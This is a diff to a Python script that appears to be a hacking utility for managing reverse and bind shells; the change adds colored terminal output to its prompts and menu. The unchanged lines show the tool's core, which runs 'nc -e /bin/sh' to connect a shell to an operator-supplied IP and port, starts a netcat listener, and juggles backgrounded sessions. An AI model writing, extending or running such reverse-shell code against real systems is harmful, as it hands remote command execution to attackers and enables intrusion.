@@ -10,12 +10,23 @@ import subprocess, sys, select, threading, signal
 processes = []
 resume = True
 
+# Colors
+HEADER = '\033[95m'
+# OKBLUE = '\033[94m'
+OKCYAN = '\033[96m'
+OKGREEN = '\033[92m'
+WARNING = '\033[93m'
+FAIL = '\033[91m'
+ENDC = '\033[0m'
+YELLOW = '\033[33m'
+GREEN = '\033[32m'
+
 def reverse_shell():
     # Start a reverse shell by connecting to the target IP and port
     resume = True
     
-    target_ip = input("\n[*] Enter target \n[!]IP: ")
-    target_port = input("[!]Port: ")
+    target_ip = input(YELLOW + "\n[*] Enter target \n[!]IP: ")
+    target_port = input(YELLOW + "[!]Port: ")
 
     p = subprocess.Popen(["nc", "-e", "/bin/sh", target_ip, target_port])
     processes.append(p)
@@ -25,7 +36,7 @@ def bind_shell():
     # Start a bind shell by listening on a specific port
     resume = True
 
-    listen_port = input("\n[*] Enter listening \n[!]Port: ")
+    listen_port = input(YELLOW + "\n[*] Enter listening \n[!]Port: ")
 
     p = subprocess.Popen(["nc", "-l", "-v", "-p", listen_port])
     processes.append(p)
@@ -43,13 +54,13 @@ def background_session():
 def list_sessions():
     # List all running sessions
     for i, p in enumerate(processes):
-        print(f"{i+1}. Session {i+1} (PID: {p.pid})")
+        print(f"{GREEN}{i+1}. Session {i+1} (PID: {p.pid})")
     
 
 def resume_session():
     # Resume background sessions
     list_sessions()
-    session_number = int(input("\nEnter the session number you want to resume: "))
+    session_number = int(input(YELLOW + "\nEnter the session number you want to resume: "))
     p = processes[session_number-1]
     p.send_signal(signal.SIGCONT)
     #subprocess.Popen(["fg", str(p.pid)])
@@ -64,19 +75,19 @@ def listen_background_session():
             c = sys.stdin.read(1)
             if c == 'b':
                 if len(processes) == 0:
-                    print("\n[!] You haven´t started any shells; Try one!")
+                    print(f"{WARNING}\n[!] You haven´t started any shells; Try one!")
                 
                 else:
                     background_session()
 
 def print_menu():
     resume = False
-    print("\n\n1. Reverse shell")
-    print("2. Bind shell")
+    print(f"{GREEN}\n\n1. Reverse shell")
+    print(f"{GREEN}2. Bind shell")
     #print("3. Background session")
     #print("3. List sessions")
-    print("3. Resume session")
-    choice = input("\n[*]Enter your choice: ")
+    print(f"{OKCYAN}3. Resume session")
+    choice = input(f"{YELLOW}\n[*]Enter your choice: ")
 
     if choice == "1":
         reverse_shell()
@@ -89,10 +100,10 @@ def print_menu():
     elif choice == "3":
         resume_session()
     else:
-        print("Invalid choice")
+        print(f"{FAIL}Invalid choice")
     
 def print_banner():
-    print("""
+    print(f"""{HEADER}
                                                        
     __                               _____             
  __|  |___ ___ ___ _ _    ___ ___   |     |___ ___ _ _ 
